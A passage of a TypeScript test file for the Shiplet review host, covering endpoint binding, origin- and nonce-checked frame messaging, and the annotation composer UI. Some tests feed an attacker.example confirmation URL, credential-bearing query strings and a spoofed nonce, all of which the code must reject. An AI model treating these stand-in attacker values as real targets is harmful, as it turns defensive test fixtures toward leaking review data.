      expect(pageUrl.toString()).not.toContain(forbidden);
    }
  });

  it("binds review operations to a credential-free trusted endpoint", async () => {
    const html = await createTrustedReviewHostResponse({
      ...baseInput,
      widgetUrl: null,
    }).text();
    expect(html).toContain(
      'data-review-api-url="https://app.shiplet.cc/api/projects/shiplet_a/review-feedback"',
    );
    expect(html).toContain('id="shiplet-kernel-review-panel"');
    expect(html).not.toContain("shiplet_preview_token");
    expect(() =>
      createTrustedReviewHostResponse({
        ...baseInput,
        reviewApiUrl: `${baseInput.reviewApiUrl}?review_token=forbidden`,
      }),
    ).toThrowError(/credential-bearing review API URL/i);
  });

  it("binds a managed host to the exact kernel confirmation endpoint without serializing authority", async () => {
    const response = createTrustedReviewHostResponse({
      ...baseInput,
      confirmationUrl: "https://app.shiplet.cc/review/confirm",
    });
    const html = await response.text();

    expect(html).toContain(
      'data-review-confirm-url="https://app.shiplet.cc/review/confirm"',
    );
    expect(html).not.toContain("review_token");
    expect(html).not.toContain("Authorization");
    expect(() =>
      createTrustedReviewHostResponse({
        ...baseInput,
        confirmationUrl: "https://attacker.example/review/confirm",
      }),
    ).toThrowError(/confirmation.*origin/i);
    expect(() =>
      createTrustedReviewHostResponse({
        ...baseInput,
        confirmationUrl:
          "https://app.shiplet.cc/review/confirm?review_token=forbidden",
      }),
    ).toThrowError(/confirmation/i);
  });

  it("allows an HTTP review-page binding only when the trusted kernel itself runs in local HTTP development", async () => {
    const local = createTrustedReviewHostResponse({
      ...baseInput,
      artifactUrl: "http://localhost:8787/shiplet/artifact-frame/",
      widgetUrl: null,
      hostScriptUrl: "http://localhost:8787/api/review/host.js",
      reviewApiUrl:
        "http://localhost:8787/api/projects/shiplet_a/review-feedback",
      confirmationUrl: "http://localhost:8787/review/confirm",
      reviewPageUrl: "http://worker-internal/shiplet_a",
    });
    expect(await local.text()).toContain(
      'data-review-page-url="http://worker-internal/shiplet_a"',
    );
    expect(() =>
      createTrustedReviewHostResponse({
        ...baseInput,
        reviewPageUrl: "http://worker-internal/shiplet_a",
      }),
    ).toThrowError(/HTTPS review page URL/i);
  });

  it("operates the managed confirmation form with explicit Shiplet and revision binding", async () => {
    const harness = await operateTrustedHostScript({
      confirmationUrl: "https://app.shiplet.cc/review/confirm",
    });
    if (!harness.comment || !harness.form) return;
    harness.comment.value = "Managed review intent";
    await harness.form.dispatch("submit", {
      preventDefault: vi.fn(),
      isTrusted: true,
    });

    expect.soft(harness.submittedForms).toHaveLength(1);
    const topLevelForm = harness.submittedForms[0];
    if (!topLevelForm) return;
    expectSecureTopLevelConfirmationForm(topLevelForm, {
      confirmationPath: "/review/confirm",
      comment: "Managed review intent",
      pageUrl: "https://client.example/pricing/",
    });
  });

  it("serves a user-mediated kernel client without ambient authority or frame-triggered mutations", () => {
    const script = trustedReviewHostScript();
    expect(script).toContain("data-review-api-url");
    expect(script).toContain('credentials: "include"');
    expect(script).toContain('form.addEventListener("submit"');
    expect(script).toContain("textContent");
    expect(script).not.toContain("__SHIPLET_REVIEW__");
    expect(script).not.toContain("Authorization");
    expect(script).not.toContain("Bearer");
    expect(script).toContain("MessageChannel");
    expect(script).toContain("widget.contentWindow");
    expect(script).toContain("artifact.contentWindow");
    expect(script).toContain("data-shiplet-annotation-canvas");
    expect(script).toContain("Draw on screenshot");
    expect(script).toContain("Done drawing");
    expect(script).toContain('window.addEventListener("message"');
    expect(script).toContain("event.source !== sourceWindow");
    expect(script).toContain('event.origin !== "null"');
    expect(script).toContain('data.protocol !== "shiplet.widget.restart.v1"');
    expect(script).toContain("data.channelNonce !== channelNonce");
    expect(script).toContain("widget.src = widgetFrameUrl");
    expect(script).not.toContain("widget.src = widget.src");
    expect(script).toContain("data-revision-id");
    expect(script).toContain("shiplet-widget-confirmation");
    expect(script).toContain('confirm.addEventListener("click"');
    expect(script).not.toContain("innerHTML");
    expect(script).not.toContain("eval(");
  });

  it("reloads a failed widget only for the exact source/origin/nonce-bound restart request", async () => {
    const harness = await operateTrustedHostScript();
    const offer = harness.offer;
    expect(offer).toBeTruthy();
    if (!offer) return;
    let widgetUrl = "https://artifact-a.shiplet.cc/__shiplet/widget/index.html";
    let reloads = 0;
    Object.defineProperty(harness.widget, "src", {
      configurable: true,
      get: () => widgetUrl,
      set: (value) => {
        reloads += 1;
        widgetUrl = String(value);
      },
    });
    const request = {
      protocol: "shiplet.widget.restart.v1",
      type: "request",
      channelNonce: offer.channelNonce,
      shipletId: offer.shipletId,
      revisionId: offer.revisionId,
    };

    await harness.window.dispatch("message", {
      source: {},
      origin: "null",
      data: request,
    });
    await harness.window.dispatch("message", {
      source: harness.widgetWindow,
      origin: "https://artifact-a.shiplet.cc",
      data: request,
    });
    await harness.window.dispatch("message", {
      source: harness.widgetWindow,
      origin: "null",
      data: { ...request, channelNonce: "wrong" },
    });
    expect(reloads).toBe(0);

    await harness.window.dispatch("message", {
      source: harness.widgetWindow,
      origin: "null",
      data: request,
    });
    await harness.window.dispatch("message", {
      source: harness.widgetWindow,
      origin: "null",
      data: request,
    });
    expect(reloads).toBe(1);
    expect(widgetUrl).toBe(
      "https://artifact-a.shiplet.cc/__shiplet/widget/index.html",
    );
  });

  // Given a widget document route that never establishes its opaque-frame
  // channel, when the trusted host times out, then the parent owns an
  // accessible failure message and only a trusted Retry reloads the exact
  // already-validated widget URL. A correctly bound fresh handshake clears it.
  it("recovers a widget document route failure from trusted parent UI", async () => {
    vi.useFakeTimers();
    try {
      const harness = await operateTrustedHostScript({ connectWidget: false });
      const recovery = harness.createdElements.find(
        (element) =>
          element.getAttribute("data-shiplet-widget-recovery") === "v1",
      );
      const retry = harness.createdElements.find(
        (element) => element.getAttribute("data-shiplet-widget-retry") === "v1",
      );
      const recoveryMessage = harness.createdElements.find(
        (element) =>
          element.getAttribute("data-shiplet-widget-recovery-message") === "v1",
      );

      expect.soft(recovery).toBeDefined();
      expect.soft(retry).toBeDefined();
      expect.soft(recoveryMessage).toBeDefined();
      if (!recovery || !retry || !recoveryMessage || !harness.offer) return;
      expect.soft(recovery.hidden).toBe(true);

      await vi.advanceTimersByTimeAsync(8_000);
      expect.soft(recovery.hidden).toBe(false);
      expect.soft(recovery.getAttribute("role")).toBe("alert");
      expect.soft(recoveryMessage.textContent).toMatch(/could not load/i);
      expect.soft(retry.textContent).toBe("Retry widget");

      const originalWidgetUrl =
        "https://artifact-a.shiplet.cc/__shiplet/widget/index.html";
      const unvalidatedWidgetUrl =
        "https://artifact-a.shiplet.cc/__shiplet/widget/not-validated.html";
      let assignedWidgetUrl = "";
      Object.defineProperty(harness.widget, "src", {
        configurable: true,
        get: () => unvalidatedWidgetUrl,
        set: (value) => {
          assignedWidgetUrl = String(value);
        },
      });
      await retry.dispatch("click", { isTrusted: false });
      expect.soft(assignedWidgetUrl).toBe("");

      await retry.dispatch("click", { isTrusted: true });
      expect.soft(assignedWidgetUrl).toBe(originalWidgetUrl);
      expect.soft(retry.disabled).toBe(true);

      await harness.widget.dispatch("load");
      const freshOffer = harness.widgetWindow.postMessage.mock.calls.at(
        -1,
      )?.[0] as Record<string, unknown> | undefined;
      expect
        .soft(freshOffer?.channelNonce)
        .not.toBe(harness.offer.channelNonce);
      if (!freshOffer) return;

      await harness.window.dispatch("message", {
        source: harness.widgetWindow,
        origin: "https://artifact-a.shiplet.cc",
        data: {
          protocol: "shiplet.widget.channel.v1",
          type: "ready",
          channelNonce: freshOffer.channelNonce,
          shipletId: freshOffer.shipletId,
          revisionId: freshOffer.revisionId,
        },
      });
      expect.soft(recovery.hidden).toBe(false);

      await harness.window.dispatch("message", {
        source: harness.widgetWindow,
        origin: "null",
        data: {
          protocol: "shiplet.widget.channel.v1",
          type: "ready",
          channelNonce: freshOffer.channelNonce,
          shipletId: freshOffer.shipletId,
          revisionId: freshOffer.revisionId,
        },
      });
      expect.soft(recovery.hidden).toBe(true);
      expect.soft(retry.disabled).toBe(false);
    } finally {
      vi.useRealTimers();
    }
  });

  it("brokers a bounded artifact capture into the human confirmation form without granting artifact authority", async () => {
    const harness = await operateTrustedHostScript({
      confirmationUrl: "https://app.shiplet.cc/review/confirm",
    });
    const captureButton = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-review-select-target") === "v1",
    );
    const capturePort = harness.channels[1]?.port1;
    expect.soft(captureButton).toBeDefined();
    expect.soft(capturePort).toBeDefined();
    if (!captureButton || !capturePort || !harness.comment || !harness.form)
      return;

    await captureButton.dispatch("click", { isTrusted: false });
    expect(capturePort.messages).toHaveLength(0);
    await captureButton.dispatch("click", { isTrusted: true });
    const command = capturePort.messages[0] as Record<string, unknown>;
    expect(command).toMatchObject({
      protocol: "shiplet.artifact.capture.command.v1",
      type: "start",
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
    });
    await capturePort.dispatch({
      protocol: "shiplet.artifact.capture.result.v1",
      type: "result",
      channelNonce: command.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      requestId: command.requestId,
      status: "captured",
      payload: {
        screenshotDataUrl:
          "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/p9sAAAAASUVORK5CYII=",
        screenshotFailureNote: null,
        screenshotMode: "element",
        viewport: { width: 1280, height: 720, devicePixelRatio: 2 },
        coordinates: {
          pageX: 240,
          pageY: 180,
          viewportX: 240,
          viewportY: 180,
        },
        selectedElement: {
          selector: "#hero",
          tagName: "H1",
          text: "Portable Shiplets",
        },
        captureContext: {
          documentWidth: 1280,
          documentHeight: 1600,
          scrollX: 0,
          scrollY: 80,
        },
      },
    });

    const target = harness.createdElements.find(
      (element) => element.className === "shiplet-review-target",
    );
    expect(target?.textContent).toContain("H1");
    expect(target?.textContent).toContain("Portable Shiplets");
    expect(target?.textContent).toContain("#hero");
    expect(target?.title).toBe("#hero");
    harness.comment.value = "Review the selected heading";
    await harness.form.dispatch("submit", {
      preventDefault: vi.fn(),
      isTrusted: true,
    });
    const confirmationForm = harness.submittedForms[0];
    expect(confirmationForm).toBeDefined();
    if (!confirmationForm) return;
    const fields = operatedFormFields(confirmationForm);
    expect(fields.screenshot_mode).toBe("element");
    expect(JSON.parse(fields.selected_element_json)).toEqual({
      selector: "#hero",
      tagName: "H1",
      text: "Portable Shiplets",
    });
    expect(fields.screenshot_data_url).toMatch(/^data:image\/png;base64,/);
    expect(JSON.stringify(fields).toLowerCase()).not.toContain("token");
    expect(JSON.stringify(fields).toLowerCase()).not.toContain("credential");
  });

  // Given the trusted annotation launcher, when a reviewer selects an artifact
  // target and asks for more context, then the host progressively reveals an
  // anchored, draggable annotation card without expanding artifact authority.
  it("enters annotation mode immediately while the artifact channel connects", async () => {
    const harness = await operateTrustedHostScript({ connectArtifact: false });
    if (!harness.launcher || !harness.artifactOffer) return;

    await harness.launcher.dispatch("click", { isTrusted: true });

    const modeBar = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-modebar") === "v1",
    );
    expect.soft(modeBar?.hidden).toBe(false);
    expect
      .soft(harness.artifact.getAttribute("data-shiplet-selecting"))
      .toBe("true");
    expect.soft(harness.launcher.getAttribute("aria-expanded")).toBe("true");

    await harness.window.dispatch("message", {
      source: harness.artifactWindow,
      origin: "null",
      data: {
        protocol: "shiplet.artifact.channel.v1",
        type: "ready",
        channelNonce: harness.artifactOffer.channelNonce,
        shipletId: harness.artifactOffer.shipletId,
        revisionId: harness.artifactOffer.revisionId,
      },
    });

    expect(harness.channels.at(-1)?.port1.messages.at(-1)).toMatchObject({
      protocol: "shiplet.artifact.capture.command.v1",
      type: "start",
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
    });
  });

  it("runs target selection through an anchored, draggable Annotate composer with exact revision context", async () => {
    const harness = await operateTrustedHostScript({
      confirmationUrl: "https://app.shiplet.cc/review/confirm",
    });
    const capturePort = harness.channels[1]?.port1;
    expect.soft(capturePort).toBeDefined();
    expect.soft(harness.launcher?.textContent).toBe("Annotate");
    expect
      .soft(harness.launcher?.getAttribute("aria-label"))
      .toContain("Annotate revision_a1");
    if (!capturePort || !harness.launcher || !harness.comment || !harness.form)
      return;

    await harness.launcher.dispatch("click", { isTrusted: true });
    const selectionCommand = capturePort.messages.at(-1) as Record<
      string,
      unknown
    >;
    expect(selectionCommand).toMatchObject({
      protocol: "shiplet.artifact.capture.command.v1",
      type: "start",
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
    });
    expect.soft(harness.panel.hidden).toBe(true);
    expect
      .soft(harness.artifact.getAttribute("data-shiplet-selecting"))
      .toBe("true");
    const modeBar = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-modebar") === "v1",
    );
    expect.soft(modeBar?.hidden).toBe(false);
    expect.soft(modeBar?.textContent).toContain("Annotating · /pricing/");
    expect.soft(modeBar?.textContent).not.toContain("revision_a1");

    await capturePort.dispatch({
      protocol: "shiplet.artifact.capture.result.v1",
      type: "result",
      channelNonce: selectionCommand.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      requestId: selectionCommand.requestId,
      status: "captured",
      payload: {
        screenshotDataUrl: null,
        screenshotFailureNote: "Screenshot unavailable in this fixture.",
        screenshotMode: "element",
        viewport: { width: 1280, height: 720, devicePixelRatio: 2 },
        coordinates: {
          pageX: 240,
          pageY: 180,
          viewportX: 240,
          viewportY: 180,
        },
        selectedElement: {
          selector: "#hero",
          tagName: "H1",
          text: "Portable Shiplets",
        },
        captureContext: {
          documentWidth: 1280,
          documentHeight: 1600,
          scrollX: 0,
          scrollY: 80,
        },
      },
    });

    expect.soft(harness.form.hidden).toBe(false);
    expect.soft(harness.form.id).toBe("shiplet-annotation-composer");
    expect
      .soft(harness.form.getAttribute("data-annotation-state"))
      .toBe("compact");
    expect.soft(harness.form.style.left).toBe("310px");
    expect.soft(harness.form.style.top).toBe("250px");
    expect.soft(harness.comment.placeholder).toBe("Add a comment…");
    expect.soft(harness.comment.getAttribute("aria-label")).toBe("Annotation");
    const selectionPin = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-target-pin") === "v1",
    );
    const targetFocus = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-target-focus") === "v1",
    );
    expect.soft(selectionPin?.hidden).toBe(false);
    expect.soft(selectionPin?.style.left).toBe("240px");
    expect.soft(selectionPin?.style.top).toBe("180px");
    expect.soft(targetFocus?.hidden).toBe(false);
    expect.soft(targetFocus?.style.left).toBe("184px");
    expect.soft(targetFocus?.style.top).toBe("144px");
    expect.soft(targetFocus?.style.width).toBe("112px");
    expect.soft(targetFocus?.style.height).toBe("72px");

    const settings = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-settings") === "v1",
    );
    expect.soft(settings?.getAttribute("aria-expanded")).toBe("false");
    await settings?.dispatch("click", { isTrusted: true });
    expect
      .soft(harness.form.getAttribute("data-annotation-state"))
      .toBe("expanded");
    expect.soft(settings?.getAttribute("aria-expanded")).toBe("true");
    const cardTitle = harness.createdElements.find(
      (element) => element.className === "shiplet-annotation-card-title",
    );
    const exactContext = harness.createdElements.find(
      (element) => element.className === "shiplet-annotation-exact-context",
    );
    const propertyList = harness.createdElements.find(
      (element) => element.className === "shiplet-annotation-properties",
    );
    const targetChip = harness.createdElements.find(
      (element) => element.className === "shiplet-review-target",
    );
    const propertyValues = harness.createdElements
      .filter(
        (element) => element.className === "shiplet-annotation-property-value",
      )
      .map((element) => element.textContent);
    const cardClose = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-card-close") === "v1",
    );
    const cancelAnnotation = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-review-cancel-compose") === "v1",
    );
    expect.soft(cardTitle?.textContent).toBe("New annotation");
    expect.soft(exactContext?.textContent).toContain("revision_a1");
    expect.soft(targetChip?.textContent).toBe("H1 · Portable Shiplets · #hero");
    expect.soft(propertyList?.tagName).toBe("DETAILS");
    expect.soft(propertyValues).not.toContain("#hero");
    expect.soft(propertyValues).toContain("1280 × 720");
    expect.soft(propertyValues).toContain("0 × 80");
    expect.soft(propertyList?.open).toBe(false);
    expect
      .soft(harness.form.children.indexOf(harness.comment))
      .toBeLessThan(harness.form.children.indexOf(propertyList!));
    expect.soft(targetFocus?.hidden).toBe(false);
    expect
      .soft(cardClose?.getAttribute("aria-label"))
      .toBe("Close annotation settings");
    expect
      .soft(cancelAnnotation?.getAttribute("aria-label"))
      .toBe("Cancel annotation");

    const dragHandle = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-drag-handle") === "v1",
    );
    await dragHandle?.dispatch("pointerdown", {
      isTrusted: true,
      pointerId: 7,
      clientX: 300,
      clientY: 240,
      preventDefault: vi.fn(),
    });
    await harness.window.dispatch("pointermove", {
      isTrusted: true,
      pointerId: 7,
      clientX: 410,
      clientY: 330,
      preventDefault: vi.fn(),
    });
    await harness.window.dispatch("pointerup", {
      isTrusted: true,
      pointerId: 7,
    });
    expect.soft(harness.form.style.left).toBe("420px");
    expect.soft(harness.form.style.top).toBe("292px");

    const escapeExpanded = {
      isTrusted: true,
      key: "Escape",
      target: harness.comment,
      preventDefault: vi.fn(),
    };
    await harness.window.dispatch("keydown", escapeExpanded);
    expect.soft(escapeExpanded.preventDefault).toHaveBeenCalled();
    expect
      .soft(harness.form.getAttribute("data-annotation-state"))
      .toBe("compact");
    expect.soft(harness.form.hidden).toBe(false);

    const escapeComposer = {
      isTrusted: true,
      key: "Escape",
      target: harness.comment,
      preventDefault: vi.fn(),
    };
    await harness.window.dispatch("keydown", escapeComposer);
    expect.soft(escapeComposer.preventDefault).toHaveBeenCalled();
    expect.soft(harness.form.hidden).toBe(true);
    expect.soft(selectionPin?.hidden).toBe(true);
    expect.soft(targetFocus?.hidden).toBe(true);
    expect.soft(harness.launcher.getAttribute("aria-expanded")).toBe("false");
  });

  // Given a selected element near a viewport edge, when the compact composer
  // expands, then its entire card remains clamped away from the persistent
  // target marker and keeps exact revision context in one readable header.
  it("keeps the target visible and unoccluded across compact and expanded annotation states", async () => {
    const harness = await operateTrustedHostScript({
      viewport: { width: 390, height: 844 },
    });
    const capturePort = harness.channels[1]?.port1;
    if (!capturePort || !harness.launcher || !harness.form) return;

    await harness.launcher.dispatch("click", { isTrusted: true });
    const command = capturePort.messages.at(-1) as Record<string, unknown>;
    await capturePort.dispatch({
      protocol: "shiplet.artifact.capture.result.v1",
      type: "result",
      channelNonce: command.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      requestId: command.requestId,
      status: "captured",
      payload: {
        screenshotDataUrl: null,
        screenshotFailureNote: null,
        screenshotMode: "element",
        viewport: { width: 390, height: 844, devicePixelRatio: 2 },
        coordinates: {
          pageX: 360,
          pageY: 782,
          viewportX: 360,
          viewportY: 782,
        },
        selectedElement: {
          selector: "#mobile-cta",
          tagName: "BUTTON",
          text: "Publish",
        },
        captureContext: {
          documentWidth: 390,
          documentHeight: 1500,
          scrollX: 0,
          scrollY: 656,
        },
      },
    });

    const pin = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-target-pin") === "v1",
    );
    const focus = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-target-focus") === "v1",
    );
    const settings = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-settings") === "v1",
    );
    const exactContext = harness.createdElements.find(
      (element) => element.className === "shiplet-annotation-exact-context",
    );

    expect.soft(harness.form.style.left).toBe("8px");
    expect.soft(harness.form.style.top).toBe("616px");
    expect.soft(pin?.style.left).toBe("360px");
    expect.soft(pin?.style.top).toBe("782px");
    expect.soft(focus?.hidden).toBe(false);

    await settings?.dispatch("click", { isTrusted: true });
    expect.soft(harness.form.style.left).toBe("8px");
    expect.soft(harness.form.style.top).toBe("312px");
    expect.soft(pin?.hidden).toBe(false);
    expect.soft(focus?.hidden).toBe(false);
    expect
      .soft(exactContext?.textContent)
      .toBe("Revision revision_a1 · /pricing/");
    const modeBar = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-modebar") === "v1",
    );
    const composerContext = harness.createdElements.find(
      (element) => element.className === "shiplet-review-composer-context",
    );
    expect.soft(modeBar?.textContent).not.toContain("revision_a1");
    expect.soft(composerContext?.hidden).toBe(true);
  });

  // Given a selected artifact element, when the opaque artifact scrolls, then
  // the target treatment and comment composer follow the element's document
  // coordinates instead of sticking to the trusted host viewport.
  it("keeps the pending annotation attached to its element while the artifact scrolls", async () => {
    const harness = await operateTrustedHostScript();
    const capturePort = harness.channels[1]?.port1;
    if (!capturePort || !harness.launcher || !harness.form) return;

    await harness.launcher.dispatch("click", { isTrusted: true });
    const command = capturePort.messages.at(-1) as Record<string, unknown>;
    await capturePort.dispatch({
      protocol: "shiplet.artifact.capture.result.v1",
      type: "result",
      channelNonce: command.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      requestId: command.requestId,
      status: "captured",
      payload: {
        screenshotDataUrl: null,
        screenshotFailureNote: null,
        screenshotMode: "element",
        viewport: { width: 900, height: 700, devicePixelRatio: 1 },
        coordinates: {
          pageX: 240,
          pageY: 880,
          viewportX: 240,
          viewportY: 180,
        },
        selectedElement: {
          selector: "#anchored-target",
          tagName: "SECTION",
          text: "Anchored target",
        },
        captureContext: {
          documentWidth: 900,
          documentHeight: 1800,
          scrollX: 0,
          scrollY: 700,
        },
      },
    });

    const pin = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-target-pin") === "v1",
    );
    const focus = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-target-focus") === "v1",
    );
    const initialComposerTop = Number.parseFloat(harness.form.style.top);

    await capturePort.dispatch({
      protocol: "shiplet.artifact.viewport.v1",
      type: "change",
      channelNonce: command.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      viewport: {
        width: 900,
        height: 700,
        documentWidth: 900,
        documentHeight: 1800,
        scrollX: 0,
        scrollY: 800,
      },
    });
    await capturePort.dispatch({
      protocol: "shiplet.artifact.anchor.v1",
      type: "position",
      channelNonce: command.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      requestId: command.requestId,
      coordinates: {
        pageX: 240,
        pageY: 880,
        viewportX: 240,
        viewportY: 80,
      },
      targetRect: { left: 120, top: 50, width: 320, height: 80 },
    });

    expect.soft(pin?.style.top).toBe("80px");
    expect.soft(focus?.style.top).toBe("50px");
    expect.soft(focus?.style.left).toBe("120px");
    expect.soft(focus?.style.width).toBe("320px");
    expect
      .soft(Number.parseFloat(harness.form.style.top))
      .toBe(initialComposerTop - 100);

    await capturePort.dispatch({
      protocol: "shiplet.artifact.viewport.v1",
      type: "change",
      channelNonce: command.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      viewport: {
        width: 900,
        height: 700,
        documentWidth: 900,
        documentHeight: 1800,
        scrollX: 0,
        scrollY: 1000,
      },
    });
    await capturePort.dispatch({
      protocol: "shiplet.artifact.anchor.v1",
      type: "position",
      channelNonce: command.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      requestId: command.requestId,
      coordinates: {
        pageX: 240,
        pageY: 880,
        viewportX: 240,
        viewportY: -120,
      },
      targetRect: { left: 120, top: -150, width: 320, height: 80 },
    });

    expect.soft(pin?.style.top).toBe("-120px");
    expect.soft(focus?.style.top).toBe("-150px");
    expect(Number.parseFloat(harness.form.style.top)).toBeLessThan(0);
  });

  it("keeps submitted comment pins attached to page coordinates while the artifact scrolls", async () => {
    const harness = await operateTrustedHostScript({
      feedback: [
        {
          id: "feedback_anchored",
          ticket_label: "REV-ANCHORED",
          comment: "This comment belongs to the target.",
          status: "New",
          coordinates: {
            pageX: 240,
            pageY: 880,
            viewportX: 240,
            viewportY: 180,
          },
        },
      ],
    });
    const capturePort = harness.channels[1]?.port1;
    const pin = harness.createdElements.find(
      (element) => element.className === "shiplet-review-pin",
    );
    const channelNonce = harness.artifactOffer?.channelNonce;
    if (!capturePort || !pin || typeof channelNonce !== "string") return;

    await capturePort.dispatch({
      protocol: "shiplet.artifact.viewport.v1",
      type: "change",
      channelNonce: "nonce_attacker",
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      viewport: {
        width: 900,
        height: 700,
        documentWidth: 900,
        documentHeight: 1800,
        scrollX: 0,
        scrollY: 800,
      },
    });
    expect.soft(pin.style.top).toBe("164px");

    await capturePort.dispatch({
      protocol: "shiplet.artifact.viewport.v1",
      type: "change",
      channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      viewport: {
        width: 900,
        height: 700,
        documentWidth: 900,
        documentHeight: 1800,
        scrollX: 0,
        scrollY: 800,
      },
    });
    expect.soft(pin.style.top).toBe("64px");

    await capturePort.dispatch({
      protocol: "shiplet.artifact.viewport.v1",
      type: "change",
      channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      viewport: {
        width: 900,
        height: 700,
        documentWidth: 900,
        documentHeight: 1800,
        scrollX: 0,
        scrollY: 1000,
      },
    });
    expect.soft(pin.style.top).toBe("-136px");
  });

  // Given an active target-selection request, when Escape is pressed before a
  // target is chosen, then the same bound artifact channel receives a cancel.
  it("cancels the highest-priority target-selection state with Escape", async () => {
    const harness = await operateTrustedHostScript();
    const capturePort = harness.channels[1]?.port1;
    if (!capturePort || !harness.launcher) return;

    await harness.launcher.dispatch("click", { isTrusted: true });
    const start = capturePort.messages.at(-1) as Record<string, unknown>;
    const escape = {
      isTrusted: true,
      key: "Escape",
      target: harness.launcher,
      preventDefault: vi.fn(),
    };
    await harness.window.dispatch("keydown", escape);

    expect.soft(escape.preventDefault).toHaveBeenCalled();
    expect(capturePort.messages.at(-1)).toMatchObject({
      protocol: "shiplet.artifact.capture.command.v1",
      type: "cancel",
      channelNonce: start.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      requestId: start.requestId,
    });
    expect
      .soft(harness.artifact.getAttribute("data-shiplet-selecting"))
      .toBe("false");
    expect.soft(harness.launcher.getAttribute("aria-expanded")).toBe("false");
  });

  it("flips and clamps the anchored composer away from viewport edges", async () => {
    const harness = await operateTrustedHostScript();
    const capturePort = harness.channels[1]?.port1;
    if (!capturePort || !harness.launcher || !harness.form) return;

    await harness.launcher.dispatch("click", { isTrusted: true });
    const command = capturePort.messages.at(-1) as Record<string, unknown>;
    await capturePort.dispatch({
      protocol: "shiplet.artifact.capture.result.v1",
      type: "result",
      channelNonce: command.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      requestId: command.requestId,
      status: "captured",
      payload: {
        screenshotDataUrl: null,
        screenshotFailureNote: null,
        screenshotMode: "element",
        viewport: { width: 900, height: 700, devicePixelRatio: 1 },
        coordinates: {
          pageX: 895,
          pageY: 695,
          viewportX: 895,
          viewportY: 695,
        },
        selectedElement: { selector: "footer", tagName: "FOOTER", text: "" },
        captureContext: {
          documentWidth: 900,
          documentHeight: 1400,
          scrollX: 0,
          scrollY: 700,
        },
      },
    });

    expect.soft(harness.form.style.left).toBe("465px");
    expect.soft(harness.form.style.top).toBe("529px");
    const pin = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-target-pin") === "v1",
    );
    expect.soft(pin?.style.left).toBe("895px");
    expect.soft(pin?.style.top).toBe("695px");

    const settings = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-annotation-settings") === "v1",
    );
    await settings?.dispatch("click", { isTrusted: true });
    expect.soft(harness.form.style.left).toBe("465px");
    expect.soft(harness.form.style.top).toBe("225px");
  });

  it("keeps element selection disabled until the opaque artifact channel is ready", async () => {
    const harness = await operateTrustedHostScript({ connectArtifact: false });
    const captureButton = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-review-select-target") === "v1",
    );
    expect(captureButton?.disabled).toBe(true);
    expect(harness.artifactOffer).toBeDefined();
    if (!captureButton || !harness.artifactOffer) return;

    await harness.window.dispatch("message", {
      source: harness.artifactWindow,
      origin: "null",
      data: {
        protocol: "shiplet.artifact.channel.v1",
        type: "ready",
        channelNonce: harness.artifactOffer.channelNonce,
        shipletId: harness.artifactOffer.shipletId,
        revisionId: harness.artifactOffer.revisionId,
      },
    });

    expect(captureButton.disabled).toBe(false);
  });

  it("recovers when cached artifact and widget loads predate deferred host setup", async () => {
    const harness = await operateTrustedHostScript({
      dispatchInitialFrameLoads: false,
    });
    const captureButton = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-review-select-target") === "v1",
    );

    expect(harness.widgetWindow.postMessage).toHaveBeenCalledWith(
      expect.objectContaining({
        protocol: "shiplet.widget.channel.v1",
        type: "offer",
      }),
      "*",
    );
    expect(harness.artifactWindow.postMessage).toHaveBeenCalledWith(
      expect.objectContaining({
        protocol: "shiplet.artifact.channel.v1",
        type: "offer",
      }),
      "*",
    );
    expect(captureButton?.disabled).toBe(false);
  });

  it("invalidates a pending artifact capture and reconnects through a fresh channel after reload", async () => {
    const harness = await operateTrustedHostScript();
    const captureButton = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-review-select-target") === "v1",
    );
    const oldPort = harness.channels[1]?.port1;
    expect(captureButton?.disabled).toBe(false);
    expect(oldPort).toBeDefined();
    if (!captureButton || !oldPort) return;

    await captureButton.dispatch("click", { isTrusted: true });
    expect(oldPort.messages.at(-1)).toMatchObject({ type: "start" });
    const offerCount = harness.artifactWindow.postMessage.mock.calls.length;

    await harness.artifact.dispatch("load");

    expect(
      harness.artifactWindow.postMessage.mock.calls.length,
    ).toBeGreaterThan(offerCount);
    expect(oldPort.messages).toEqual(
